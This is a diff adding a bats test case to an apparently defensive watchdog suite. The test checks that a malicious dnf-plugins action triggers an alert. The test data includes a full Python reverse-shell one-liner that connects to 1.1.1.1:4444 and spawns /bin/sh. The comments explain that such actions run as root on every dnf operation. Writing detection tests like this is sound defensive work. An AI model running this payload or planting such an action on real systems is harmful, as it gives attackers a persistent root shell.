@@ -328,3 +328,16 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on dnf-plugins action surface)" {
+    # Sister to nc / curl|bash / dev-tcp dnf-plugins action
+    # rev-shell variants. Python on every RHEL/Fedora host
+    # (dnf itself is Python). T1546 package-transaction-trigger
+    # root-exec — actions run AS ROOT on every dnf operation.
+    printf '*:in:/usr/bin/needs-restarting -r\n' > "${ACTION}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '*:in:python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);pty.spawn(\\"/bin/sh\\")"\n' > "${ACTION}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
